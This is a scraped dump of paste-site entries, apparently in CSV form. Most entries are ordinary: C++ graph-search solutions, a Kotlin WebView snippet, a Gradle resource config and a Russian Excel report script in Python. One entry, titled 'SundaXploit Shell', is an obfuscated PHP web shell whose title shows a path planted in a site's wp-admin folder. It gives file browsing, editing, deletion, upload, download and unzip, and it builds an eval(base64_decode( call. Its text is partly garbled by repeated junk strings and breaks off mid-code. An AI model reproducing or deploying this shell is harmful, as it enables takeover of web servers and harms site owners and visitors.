	for(int i=N;i>0;i--)if(!visit[data_stack[i]])dfs2(data_stack[i]);
	printf(""%d"",cnt);
	return 0;
}
/*
5
2 4 3 0
4 5 0
0
0
1 0
*/"
zjtszpnb,1148cdrom,MathinChina,C++,Wednesday 3rd of July 2024 03:23:45 AM CDT,"#include<bits/stdc++.h>
using namespace std;
const int maxn=205;
int f[maxn],g[maxn][maxn],t,ans,n;
int main()
{
	cin>>n;
	bitset<maxn> b[maxn];
	for(int i=0;i<=n;i++)
	{
		while(1){
			cin>>t;
			if(!t)break;
			b[t].set(i);
		}
	}
	for(int k =0; k < n; k++)for(int i =0;i < n;i++)if(b[i][k])b[i] |=b[k];
	for(int i =0; i < n; i++)f[i] = i;
	for(int i =0; i < n; i++)for(int j =0; j < n; j++)if(g[i][j]) f[j] = f[i];
	for(int i =0; i < n; i++)if(f[i] == i)ans++;
	cout<<ans<<endl;
	return 0;
}
"
Sa0yagre,50110cdrom,MathinChina,C++,Wednesday 3rd of July 2024 03:22:14 AM CDT,"#include <iostream>
using namespace std;
int v[200005],g[200005],dep[200005],cnt,n,t;
void dfs1(int i){
	v[i] = 1;
	for (int j = 0; j < n; j++)
		if (g[i]==j && !v[j])
			dfs1(j);
	dep[++t] = i;
}
void dfs2(int i){
	v[i] = 1;
	cnt++;
	for (int j = 0; j < n; j++)
		if (g[j]==i && !v[j])
			dfs2(j);
}

int main(int argc, char** argv)
{
	cin>>n;
	for(int i=1;i<=n;i++)
	{
		cin>>t;
		g[i]=t;
	}
	for(int i=1;i<=n;i++)if(!v[i])dfs1(i);
	for(int i=1;i<=n;i++)v[i]=0;
	for(int i=t;i>0;i++)if(!v[dep[i]])dfs2(dep[i]);
	cout<<cnt<<endl;
	return 0;
}"
5quBM8rB,Webview Optimize performance ex,d4nsupperman,Kotlin,Wednesday 3rd of July 2024 02:14:29 AM CDT,"webViewRadar.setOnTouchListener { _, event ->
    when (event!!.action) {
        MotionEvent.ACTION_DOWN -> {
            mHandler.removeCallbacksAndMessages(null)
            resume()
        }

        MotionEvent.ACTION_UP -> pauseWithDelay() // T·ª± ƒë·ªông pause sau 15s
    }
    false
}"
QuzP2Lhs,Gradle: sourceSet configs example,d4nsupperman,Groovy,Wednesday 3rd of July 2024 02:02:18 AM CDT,"    sourceSets {	
		wf3_production {
            res {
                srcDirs += [
                        ""./wf3_theme_res/resource"",
                        ""./wf3_theme_res/icons/set_2d"",
                        ""./wf3_theme_res/icons/set_flat"",
                        ""./wf3_theme_res/icons/set_line"",
                        ""./wf3_theme_res/icons/set_3d"",
                        ""./wf3_theme_res/backgrounds/set_sky"",
                        ""./wf3_theme_res/backgrounds/set_ocean"",
                        ""./wf3_theme_res/backgrounds/set_art"",
                        ""./wf3_theme_res/backgrounds/set_color"",
                        ""./wf3_theme_res/backgrounds/set_country"",
                        ""./wf3_theme_res/backgrounds/set_urban"",
                        ""./wf3_theme_res/backgrounds/set_earth"",
                        ""./wf3_theme_res/backgrounds_widget/urban"",
                        ""./wf3_theme_res/backgrounds_widget/country"",
                        ""./wf3_theme_res/backgrounds_widget/art"",
                        ""./wf3_theme_res/backgrounds_widget/sky"",
                        ""./wf3_theme_res/backgrounds_widget/ocean"",
                        ""./wf3_theme_res/backgrounds_widget/earth"",
                ]
            }
        }
        wf3_radar_adDebug {
            res {
                srcDirs += [
                        ""./wf3_radar_theme_res/resource"",
                        ""./wf3_radar_theme_res/icons/set_2d"",
                        ""./wf3_radar_theme_res/icons/set_flat"",
                        ""./wf3_radar_theme_res/icons/set_line"",
                        ""./wf3_radar_theme_res/icons/set_3d"",
                        ""./wf3_radar_theme_res/backgrounds/set_sky"",
                        ""./wf3_radar_theme_res/backgrounds/set_ocean"",
                        ""./wf3_radar_theme_res/backgrounds/set_art"",
                        ""./wf3_radar_theme_res/backgrounds/set_color"",
                        ""./wf3_radar_theme_res/backgrounds/set_country"",
                        ""./wf3_radar_theme_res/backgrounds/set_urban"",
                        ""./wf3_radar_theme_res/backgrounds/set_earth"",
                        ""./wf3_radar_theme_res/backgrounds_widget/urban"",
                        ""./wf3_radar_theme_res/backgrounds_widget/country"",
                        ""./wf3_radar_theme_res/backgrounds_widget/art"",
                        ""./wf3_radar_theme_res/backgrounds_widget/sky"",
                        ""./wf3_radar_theme_res/backgrounds_widget/ocean"",
                        ""./wf3_radar_theme_res/backgrounds_widget/earth"",
                ]
            }
        }
	}"
Y3zLRP4R,–æ—Ç—á–µ—Ç —ç–∫—Å–µ–ª—è,Rei_anami,Python,Wednesday 3rd of July 2024 01:44:26 AM CDT,"import os
from openpyxl import load_workbook


# –£–∫–∞–∑—ã–≤–∞–µ–º –ø—É—Ç—å –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
directory = ""C:/Users/User/Downloads""
 
# –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
files = os.listdir(directory)
 
# –í—ã–≤–æ–¥–∏–º —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
name_otch = '' #–Ω–∞–∑–≤–∞–Ω–∏–µ –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –Ω—É–∂–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞
for i in files:
    if i[-4:] == 'xlsx' and i[:11] == 'orders - 20':
        #print(i, ""–ù–ê–ú –ù–£–ñ–ù–û –≠–¢–û"")
        name_otch = i
print(name_otch, ""<--- –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞–∑–≤–∞–Ω–∏–µ –æ—Ç—á–µ—Ç–∞ —Å–∫–∞—á–∞–Ω–Ω–æ–≥–æ —Å —è–Ω–¥–µ–∫—Å–∞"")     
print(""Enter 1 —Ä–∞–∑ –µ—Å–ª–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ"")
input()   
#filename = os.path.basename(directory)
#print(filename,'filename')  # –í—ã–≤–æ–¥: c

#name_excel = str(input())

#print(""–≤—Å—Ç–∞–≤–∏—Ç—å –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ excel –¥–æ .xlsx"", ""–ø—Ä–∏–º–µ—Ä"", ""orders - 2024-06-24T205358.419"", ""–∏ –Ω–∞–∂–∞—Ç—å Enter"", sep= ""\n"")
#wbwb = str(input()) ##–∏–º—è —ç–∫—Å–µ–ª—è
wbwb = name_otch
#print(wbwb)
wb = load_workbook(wbwb)

#print('Yes1')
#print(wb)
#print(""-----------"")
#print(wb.get_sheet_names())
print(""---------------------------"")
#print(""++++----"")
sheet = wb['orders_report']
#print(sheet['H5'].value)
#print(sheet['I2'].value)
#print(""++++----"")
pr_pre = 0
pr_card = 0
pr_cash = 0
si=""I"" #—Ü–µ–Ω–∞
sh = ""H"" #–∫–∞–∫ –æ–ø–ª–∞—á–µ–Ω–æ
#print(sheet['D52'].value, 'empty')

stp = ""I""
stp2 = ""H""
stp3 = ""K""
stp4 = ""D""
n_strok = 500
n_vidan = 0
for j in range(2,n_strok):
    stp += str(j)
    stp2 += str(j)
    stp4 += str(j)
    print(sheet[stp2].value, sheet[stp].value) 
    if sheet[stp2].value == '–ü—Ä–µ–¥–æ–ø–ª–∞—á–µ–Ω' and sheet[stp4].value == '–ó–∞–∫–∞–∑ –ø–µ—Ä–µ–¥–∞–Ω –∫–ª–∏–µ–Ω—Ç—É':
        pr_pre += float(sheet[stp].value)
        n_vidan += 1
    elif sheet[stp2].value == '–û–ø–ª–∞—á–µ–Ω –Ω–∞–ª–∏—á–Ω—ã–º–∏' and sheet[stp4].value == '–ó–∞–∫–∞–∑ –ø–µ—Ä–µ–¥–∞–Ω –∫–ª–∏–µ–Ω—Ç—É':
        pr_cash += float(sheet[stp].value)
        n_vidan += 1
    elif sheet[stp2].value == '–û–ø–ª–∞—á–µ–Ω –∫–∞—Ä—Ç–æ–π' and sheet[stp4].value == '–ó–∞–∫–∞–∑ –ø–µ—Ä–µ–¥–∞–Ω –∫–ª–∏–µ–Ω—Ç—É':
        pr_card += float(sheet[stp].value)
        n_vidan += 1
    print()
    stp = 'I'
    stp2 = 'H'
    stp3 += str(j)
    stp4 = 'D'
    if sheet[stp3].value == None:
        print('stop')
        break
    else:
        stp3 = 'K'
print(""-----------------------------"")    
print(""–ü—Ä–µ–¥–æ–ø–ª–∞—á–µ–Ω:"")
print(pr_pre)
print()
print(""–û–ø–ª–∞—á–µ–Ω –∫–∞—Ä—Ç–æ–π:"")
print(pr_card)
print()
print(""–û–ø–ª–∞—á–µ–Ω –Ω–∞–ª–∏—á–Ω—ã–º–∏"")
print(pr_cash)
print()
print(""–í—ã–¥–∞–Ω–æ –≤—Å–µ–≥–æ"")
print(n_vidan)
print()
print(""Enter 2 —Ä–∞–∑–∞ –¥–ª—è –≤—ã—Ö–æ–¥–∞"")
input()
input()
"
G7KfpTRA,SundaXploit Shell,willysec_id,PHP,Tuesday 2nd of July 2024 11:20:55 PM CDT,"<title>sundaxploit</title>
<h1>sundaxploit</h1>
<html>
<head>
	<title>/home/u913393418/domains/adelsocial.com/public_html/wp-admin/ahuy.php</title>
	<style type=""text/css"">
	INPUT[type=""text""] {background-color: #fff8e7;}	body{background: #fff8e7;color: #4c5866;font-family: Verdana;font-size: 11px;}
	a:link{color: #33CC99;}	a:visited{color: #33CC99;}	a:hover{text-decoration: none;Color: #3399FF;}table {font-size: 11px;}
	td {padding: 1px;padding-left: 10px;padding-right: 10px;padding-top: 2px;}
	</style>
</head>
<body>
<table cellpadding=""5"" width=""80%"">
<title>sundaxploit</title>
<h1>sundaxploit</h1>
<?php
 goto XqKQl; Pdrln: BixNK: goto xVvfW; uUvCz: $ZV5BV = ""\x40\x72\145\161\165\151\x72\x65""; goto is2iM; TiO86: goto rzl0N; goto pavBl; v0w3L: ygMBB: goto MeppW; Nmkuu: $DX8LI = Gm9CQ($_SERVER[""\x53\x43\122\111\x50\124\x5f\106\x49\x4c\105\116\x41\x4d\105""], ''); goto wF0pz; uwGL8: MeHGB: goto J9A41; DOjb2: ljsRq: goto V_yBv; YHTFb: FC1rI: goto QoeRX; HIcgm: ATDrg: goto HQO8v; bkt1o: hH85a: goto ax0TJ; qfqmm: foreach ($L2igI as $HUwOC) { goto im5Ay; im5Ay: if (!($HUwOC !== null and $HUwOC !== '' and $HUwOC !== ""\x20"")) { goto EEHJm; } goto P6DYc; P6DYc: fwrite($DhVT3, $HUwOC . ""\12""); goto VWChD; VWChD: EEHJm: goto Yd6JD; Yd6JD: gycRH: goto JWkGk; JWkGk: } goto tarvp; on9Rz: FZDRH: goto c9gbq; uVZuN: if (empty($_POST[""\156\x5f\156\141\155\145""])) { goto nU65v; } goto UHeCH; UP3Rp: florf: goto dtSuw; P9h3R: if (!isset($_GET[""\x64\x65\154""])) { goto Eo14L; } goto ENf9L; UbR8h: Gnbma: goto vEpc6; DCXVe: goto mP2FX; goto uM2zE; Hxqi_: MJcgr: goto WKo2f; Fvq0g: echo ""\x9\xd\12\x9\11\11\x3c\x73\x63\162\x69\160\x74\x20\x6c\x61\156\x67\x75\x61\147\x65\x20\75\x20\47\x6a\141\166\x61\x73\143\162\x69\x70\x74\47\x3e\15\xa\x9\x9\x9\x76\x61\162\x20\x64\145\154\141\x79\40\x3d\x20\61\60\x30\73\xd\12\x9\11\11\163\145\x74\124\151\x6d\x65\x6f\x75\x74\50\x22\144\x6f\x63\165\x6d\x65\156\164\56\x6c\x6f\x63\x61\164\x69\157\x6e\x2e\150\162\145\x66\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJtxmUW: $WXRUO = substr_replace($qag9p, '', $Konpu, 99999); goto STIVg; YW9om: $Konpu = strripos($qag9p, ""\x2f""); goto txmUW; eSyKs: } goto slSKO; N14Yf: if ($LztR2 !== $QB964) { goto QGBmt; } goto tjGNA; XqKQl: function NDOmT($Ia7Nm) { goto Xfg4P; r3Vhw: $UuXBg = nDomt($Ia7Nm . ""\x2f"" . $dWgkk); goto vXjfh; m8cHL: JLFTW: goto b8QcF; Z_w16: Lqzre: goto SveCi; IDqdI: $UuXBg = array(); goto xzTkB; CAPPN: e6KBZ: goto r3Vhw; x7vGV: $cIKiU[] = $Ia7Nm . ""\x2f"" . $dWgkk; goto Df689; SveCi: closedir($RDrhf); goto g2eWr; oSiv8: if (is_dir($Ia7Nm . ""\57"" . $dWgkk)) { goto e6KBZ; } goto x7vGV; xfyQ3: if (!($dWgkk != ""\56"" && $dWgkk != ""\x2e\56"")) { goto ph1Ju; } goto oSiv8; D2a0K: $cIKiU = array(); goto IDqdI; vXjfh: $cIKiU = array_merge($cIKiU, $UuXBg); goto m8cHL; l4Lzg: goto meqrb; goto Z_w16; SLl1u: if (!(false !== ($dWgkk = readdir($RDrhf)))) { goto Lqzre; } goto xfyQ3; xzTkB: meqrb: goto SLl1u; Df689: goto JLFTW; goto CAPPN; b8QcF: ph1Ju: goto l4Lzg; Xfg4P: $RDrhf = opendir($Ia7Nm) or die(""\x43\x61\156\47\x74\x20\157\x70\x65\156\40\144\x69\x72\x65\x63\x74\x6f\x72\x79\40{$Ia7Nm}""); goto D2a0K; g2eWr: return $cIKiU; goto roq_i; roq_i: } goto p1ei3; Wb2hf: $QqgvR = $_SERVER[""\x53\103\x52\111\x50\x54\137\116\x41\x4d\x45""]; goto K61Rm; kedt_: echo ""\x3c\x74\x72\x20\141\154\151\147\156\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ154\x64\x65\x72\40\143\x72\145\x61\x74\145\144\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ76"" . ""\x3c\x74\x64\76\74\x2f\164\144\x3e\x3c\x74\144\x3e\74\x2f\164\x64\x3e\x3c\x74\x64\76\74\57\164\x64\76\74\164\144\x3e\74\x2f\164\144\76\x3c\x2f\x74\x72\x3e""; goto Eo0Zl; YVJT8: $P3pJd = $_SERVER[""\104\117\x43\125\x4d\105\116\x54\x5f\122\x4f\117\x54""] . ""\57"" . $_POST[""\156\145\167\137\x66\x69\154\145\137\156\141\x6d\x65""]; goto bg6ai; zn_3T: echo $_SERVER[""\123\x43\x52\111\x50\124\x5f\x46\111\114\105\x4e\101\x4d\x45""]; goto hsPe0; Epl6l: echo ""\74\146\x6f\x6e\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x65\x64\x20\x73\165\143\143\x65\x73\163\x66\165\x6c\x6c\171\x21\74\57\x66\x6f\x6e\x74\76""; goto q2G1V; QIeXQ: mmJe3: goto uZ3kD; ypa05: $WMWFy = ""\x66\x69\x6c\145\137\147\145\164\x5f\143\157\x6e\164\145\x6e\x74\x73\50\134\42\x2e\56\57\x69\156\144\x65\170\x2e\160\150\x70\x5c\42\x29\x22""; goto cNalV; VSZjt: fclose($DhVT3); goto MGFAs; z2e4Z: $BwPeK = explode(""\x2f"", $qag9p); goto ubSOD; glwiB: BCM4T: goto HkcsN; oJIlv: DZiIV: goto rsptO; vy7Dk: $P3pJd = $_GET[""\x64\x69\x72""] . ""\x2f"" . $_POST[""\x6e\145\x77\137\146\151\x6c\145\137\156\141\x6d\145""]; goto hSlgZ; G18c9: foreach ($CBxRP as $v3hoM) { goto G21Ml; rM5Tz: $lm1oa = $_SERVER[""\104\117\x43\125\115\105\x4e\124\x5f\122\x4f\117\124""] . ""\x2f"" . $v3hoM; goto QTzXx; jjPrA: goto E2k4o; goto Q3qNu; uxwtB: if (isset($_GET[""\x64\151\162""])) { goto t8d3R; } goto rM5Tz; WHYBa: $DtzO6[] = $v3hoM; goto yIYlH; QTzXx: goto IKu9i; goto cwA_B; yIYlH: E2k4o: goto r8dyB; fmLrL: IKu9i: goto en7b9; en7b9: if (is_dir($lm1oa)) { goto bmUHS; } goto ZNbZO; G21Ml: $lm1oa = $v3hoM; goto uxwtB; Q3qNu: bmUHS: goto WHYBa; r8dyB: HUjaa: goto rW3EB; cwA_B: t8d3R: goto gx0Q3; ZNbZO: $xWYvg[] = $v3hoM; goto jjPrA; gx0Q3: $lm1oa = $_GET[""\144\x69\x72""] . ""\57"" . $v3hoM; goto fmLrL; rW3EB: } goto HWC40; rsptO: if (isset($_GET[""\144\x69\x72""])) { goto hZdgt; } goto xezD4; XAIvh: $LztR2++; goto Ze119; U4RHe: if (file_exists($aPaH9)) { goto kS14f; } goto IZOXi; CqaGD: $ut7CJ = $_SERVER[""\x53\103\122\x49\x50\124\137\x4e\x41\115\105""] . ""\77\x64\x69\162\x3d"" . $_SERVER[""\104\117\103\125\x4d\x45\116\x54\x5f\122\x4f\117\x54""]; goto dURPl; cQKyY: RIwZN: goto bXUqM; ubSOD: $QB964 = count($BwPeK) - 1; goto roUBW; J9A41: if (!($LztR2 <= $QB964)) { goto GNZed; } goto gl3ZF; a4BUt: exit; goto o5qhH; e2TW0: if (!isset($_GET[""\165\156\172\x69\x70""])) { goto jqLnL; } goto twpV_; VZF1A: $qVSSk = w4qEL($qag9p); goto oz78r; u4OG7: header(""\103\157\156\x74\145\156\164\x2d\104\x65\x73\143\x72\x69\160\164\x69\x6f\156\x3a\40\x46\151\x6c\145\x20\x54\162\x61\x6e\x73\x66\x65\162""); goto CDuMW; CGm2h: if (file_exists($aPaH9) and filesize($aPaH9) > 1) { goto mCKiQ; } goto DJVjG; jgc8L: $hn0uw = w4QeL($_SERVER[""\x44\117\103\125\x4d\105\116\x54\x5f\122\x4f\117\x54""]); goto GKj5d; tarvp: vpRpT: goto VSZjt; tSCjr: gHqv3: goto XAIvh; uhd1R: $UHjCg = ""\x65\x76\x61\x6c\x28\x62\141\163\145\66\x34\137\x64\145\x63\x6f\144\x65\50""; goto nS2xr; w58PV: OLwSY: goto yqavc; QaWTu: $n7IRr = 0; goto Gqh_1; KG1Xz: foreach ($CBxRP as $QGpbl) { goto JyAvq; JyAvq: $Lx4lh = str_replace($_SERVER[""\104\117\103\x55\x4d\105\116\x54\x5f\122\117\x4f\x54""], $_SERVER[""\x53\105\122\126\105\122\137\116\x41\x4d\x45""], $QGpbl); goto SpquO; SpquO: echo $Lx4lh . ""\73"" . filesize($QGpbl) . ""\x3c\x62\x72\x3e\xa""; goto ESRRJ; ESRRJ: qELdT: goto D9C8t; D9C8t: } goto Gd5zs; h_UK6: $W1py1 = ""\x63\x61\x63\x68\x65\x3d\x30\60""; goto ypa05; IGVTY: t8W8C: goto USSyq; uZ3kD: Eo14L: goto S1Dbo; eMK1j: nU65v: goto TKRWF; OrRxQ: goto mP2FX; goto tkDiO; YEiIr: E7m1U: goto Bnibf; uM2zE: Bl4wU: goto UXqP9; ppEC0: if (isset($_GET[""\144\x69\162""])) { goto nXRAt; } goto CqaGD; ync6F: $CBxRP = scandir($_SERVER[""\104\x4f\103\x55\x4d\x45\116\124\137\122\x4f\x4f\x54""]); goto oZsLs; gl3ZF: $cjZuP = UHgxi($cjZuP); goto A6dPZ; SoZOb: if (!($n7IRr < 900)) { goto ATDrg; } goto HLNHF; V_yBv: $CBxRP = scandir($_GET[""\144\151\162""]); goto ok3Ws; ouA0y: z4_go: goto f_RKQ; bH693: foreach ($xWYvg as $v3hoM) { goto ETQw9; KRPJL: $kUjp8 = ""\x23\x66\146\x66\x66\145\60""; goto WMDBs; W0bHb: $Y1ljX = $_GET[""\144\151\x72""] . ""\57"" . $v3hoM; goto ffRGy; ffRGy: $tO3kQ = $_GET[""\144\x69\x72""]; goto Svnev; WMDBs: goto yQXuc; goto ZxNX8; VzVgu: echo ""\x3c\164\162\x20\142\x67\x63\x6f\x6c\157\162\75\x22{$kUjp8}\x22\x20\141\154\151\147\x6e\75\x22\143\145\x6e\164\x65\x72\42\x3e\x3c\164\144\x20\141\154\x69\x67\156\75\x22\154\145\146\x74\x22\x20\x3e"" . ""\x3c\141\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx6e\157\x6e\x65\x3b\x22\40\150\162\145\x66\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJtO3kQ}\x22\x3e\x3c\146\157\156\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx2f\141\x3e"" . ""\x3c\x2f\x74\x64\x3e\74\x74\x64\76"" . buCNk($Y1ljX) . ""\x3c\57\164\144\76\x3c\164\144\x3e{$Npkhx}\74\57\164\x64\76\x3c\x74\x64\76"" . gM9cQ($Y1ljX, ""\x30"") . ""\x3c\57\x74\144\76\x3c\x74\144\76"" . ""\74\141\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ}\x26\144\x69\162\x3d{$tO3kQ}\42\x3e\x55\74\x2f\x61\x3e\x26\156\142\163\x70\73"" . $F4gM4 . ""\x3c\141\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x74\x70\72\57\57{$uQts7}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\164\x70\72\57\x2f{$VdNWK}{$QqgvR}\77\144\157\x77\156\154\x6f\141\x64\x3d{$Y1ljX}\x26\x64\151\162\x3d{$tO3kQ}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ = str_replace($_SERVER[""\x44\x4f\x43\x55\x4d\105\116\124\x5f\x52\117\x4f\124""], $_SERVER[""\x53\105\122\126\x45\122\137\116\101\x4d\x45""], $Y1ljX); goto v29oZ; CH1vu: $F4gM4 = ""\74\141\40\x68\162\145\146\75\x22\150\x74\164\x70\72\x2f\57{$VdNWK}{$QqgvR}\77\x65\x64\x69\164\x3d{$Y1ljX}\46\144\151\x72\x3d{$tO3kQ}\x22\76\105\x3c\57\141\76\46\x6e\x62\163\x70\73""; goto Y_jOY; zNpap: $Ay1ZD++; goto tiP26; mTTR2: $F4gM4 = ""\x3c\141\40\x68\162\145\x66\75\42\x68\164\164\160\72\57\x2f{$VdNWK}{$QqgvR}\x3f\165\156\172\151\x70\x3d{$Y1ljX}\x26\x64\151\162\x3d{$tO3kQ}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJrVEh3; } goto KRPJL; GoaD8: P31sB: goto VzVgu; kk0FG: if ($F4gM4 !== false) { goto orsU0; } goto CH1vu; SP6EO: goto FHW6Y; goto v0Q1l; ETQw9: if (isset($_GET[""\x64\x69\x72""])) { goto fCfZQ; } goto IRUp3; Y_jOY: goto P31sB; goto x_2xh; YUyiZ: $F4gM4 = stristr($v3hoM, ""\x2e\x7a\x69\160""); goto kk0FG; IRUp3: $Y1ljX = $_SERVER[""\104\x4f\103\125\x4d\x45\x4e\x54\x5f\122\x4f\117\124""] . ""\57"" . $v3hoM; goto CLVN3; v0Q1l: fCfZQ: goto W0bHb; uMbgf: $kUjp8 = ""\43\146\146\146\x38\x65\67""; goto EI8Ko; Svnev: FHW6Y: goto QtH0o; tiP26: E0wV8: goto GvHcN; EI8Ko: yQXuc: goto YUyiZ; CLVN3: $tO3kQ = $_SERVER[""\104\x4f\103\x55\115\x45\116\124\x5f\x52\117\x4f\124""]; goto SP6EO; QtH0o: $Npkhx = ac9Dk($Y1ljX); goto Pxm9m; ZxNX8: rVEh3: goto uMbgf; x_2xh: orsU0: goto mTTR2; GvHcN: } goto nfUOK; Z0ioE: eMo3f: goto gdP6e; a_393: gzpBn: goto r8tk0; C0cMJ: goto mP2FX; goto oJIlv; lNx_2: echo ""\74\142\x72\x3e\xd\12\11\x9\x9\123\x65\x72\166\x65\x72\x20\x49\x50\x3a\40""; goto InZQR; cDKDj: $xWYvg = array(); goto M5Adj; TzRgx: goto rzl0N; goto vazmA; RG_ti: function w4qeL($p3Afk) { goto I0Y_v; WZtLR: goto x5AK3; goto mqIYp; HyT8T: if (is_dir($YyrSc)) { goto VaAYQ; } goto Mlnbs; USB7I: n2zCl: goto kkMi3; kwuce: b0AoT: goto WZtLR; dbbc3: x5AK3: goto ia6IZ; VndL5: $rzkQ7[] = $YyrSc; goto kwuce; Bia9p: jwkvZ: goto n1onz; n1onz: closedir($RDrhf); goto cPUXB; Mlnbs: $mgYQB = stristr($YyrSc, $_SERVER[""\123\x43\122\111\120\124\x5f\106\x49\114\x45\x4e\x41\x4d\105""]); goto M0GqF; lxJWI: $YyrSc = $p3Afk . ""\57"" . $dWgkk; goto HyT8T; I0Y_v: global $rzkQ7; goto Mlidt; Mlidt: $cIKiU = array(); goto dbtKr; Jdkx2: if (!(($dWgkk = readdir($RDrhf)) !== false)) { goto jwkvZ; } goto Yt4RC; dbtKr: if ($RDrhf = opendir($p3Afk)) { goto n2zCl; } goto A0uJE; oc3dR: W4QEl($YyrSc); goto dbbc3; Yt4RC: if (!($dWgkk != ""\56"" && $dWgkk != ""\x2e\56"")) { goto TTgZu; } goto lxJWI; cPUXB: return $rzkQ7; goto EbxdO; ia6IZ: TTgZu: goto gtL4R; M0GqF: if (!($mgYQB == false)) { goto b0AoT; } goto VndL5; YffRV: ms9G9: goto Jdkx2; kkMi3: $RDrhf = opendir($p3Afk); goto YffRV; mqIYp: VaAYQ: goto oc3dR; gtL4R: goto ms9G9; goto Bia9p; A0uJE: chmod($p3Afk, 0755); goto USB7I; EbxdO: } goto e2TW0; j95qR: if ($Erk1y = mkdir($qag9p)) { goto t8W8C; } goto JnXjv; ZJ1QG: if (isset($_POST[""\156\145\167\x5f\x66\x69\154\x65\137\x6e\x61\155\145""])) { goto qQEth; } goto Pbgzh; LjCDj: yRZid: goto AMoB2; WbP_O: rAsA0: goto kxckI; bXUqM: $n7IRr++; goto y36Yt; wKVee: foreach ($qVSSk as $KHapq) { goto rb2nM; rb2nM: $mgYQB = stristr($KHapq, $ncBPG); goto Zq8Mw; Zq8Mw: if (!($mgYQB !== false)) { goto uY1eG; } goto Vwa3q; Vwa3q: $Npkhx = aC9Dk($KHapq); goto DkzDj; DkzDj: $uQts7 = str_replace($_SERVER[""\x44\117\103\x55\115\x45\116\124\137\x52\117\x4f\124""], $_SERVER[""\123\105\122\126\x45\x52\137\x4e\101\115\105""], $KHapq); goto bvY_g; MIO_7: GO8BX: goto WHWgL; bvY_g: echo ""\x3c\164\162\x20\142\147\143\157\x6c\157\162\75\x22\x23\146\146\x66\146\146\x66\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\156\x3d\x22\x6c\145\x66\164\42\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx69\x6f\x6e\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x65\144\x69\164\x3d{$KHapq}\x26\144\151\162\x3d{$tO3kQ}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ57\x66\x6f\x6e\x74\x3e\x3c\x2f\x61\x3e"" . ""\74\57\x74\x64\76\74\164\x64\x3e"" . bUcnk($KHapq) . ""\74\57\164\144\76\x3c\164\144\76{$Npkhx}\x3c\57\164\x64\76\x3c\164\x64\76"" . gM9cQ($KHapq, ""\60"") . ""\74\57\x74\x64\x3e\74\164\x64\x3e"" . ""\74\x61\x20\x68\x72\x65\146\75\42\150\164\164\160\x3a\x2f\x2f{$VdNWK}{$QqgvR}\77\x64\x65\154\x3d{$KHapq}\x26\144\151\162\75{$tO3kQ}\x22\x3e\x55\x3c\57\141\x3e\x26\x6e\x62\x73\x70\x3b"" . ""\74\141\x20\x68\x72\x65\146\x3d\x22\x68\164\164\x70\72\57\x2f{$VdNWK}{$QqgvR}\77\145\144\x69\164\x3d{$KHapq}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ141\x72\147\x65\x74\75\42\137\142\154\x61\x6e\153\x22\x20\150\x72\x65\x66\75\x22\x68\164\x74\x70\x3a\57\x2f{$uQts7}\x22\76\117\74\57\141\76\46\x6e\x62\163\x70\x3b"" . 